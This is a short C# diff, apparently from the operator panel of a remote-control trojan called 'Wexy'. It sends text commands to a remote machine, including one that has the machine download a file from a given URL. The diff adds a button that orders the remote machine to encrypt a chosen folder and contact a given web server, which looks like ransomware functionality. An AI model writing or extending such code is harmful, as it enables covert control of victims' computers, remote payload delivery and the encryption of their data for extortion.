@@ -40,6 +40,7 @@ namespace Wexy
                 }
                 else
                 {
+                    //These special commands require instant data reply using the revceivedata() method
                     switch (Command)
                     {
                         case "pcname>":
@@ -125,7 +126,6 @@ namespace Wexy
                 Thread.Sleep(10);
                 try
                 {
-                    //195000 = 195 ko
                     byte[] RecPacket = new byte[195000];
                     Receiver.Read(RecPacket, 0, RecPacket.Length);
                     switch (fileType)
@@ -359,15 +359,24 @@ namespace Wexy
             }
         }
 
-        #endregion
-
         private void btn_remote_download_Click(object sender, EventArgs e)
         {
             DownloadFileForm dff = new DownloadFileForm();
             dff.ShowDialog();
             string fileName = dff.GetFilename();
             string url = dff.GetUrl();
-            SendCommand("remote>" + url +">"+fileName+">");
+            SendCommand("remote>" + url + ">" + fileName + ">");
         }
+
+        private void btn_encrypt_folder_Click(object sender, EventArgs e)
+        {
+            EncryptFolderForm ef = new EncryptFolderForm();
+            ef.ShowDialog();
+            string folderpath = ef.getFolderPath();
+            string webServerUrl = ef.getWebServerUrl();
+            SendCommand("encryptfolder>" + folderpath + ">" + webServerUrl + ">");
+        }
+
+        #endregion   
     }
 }
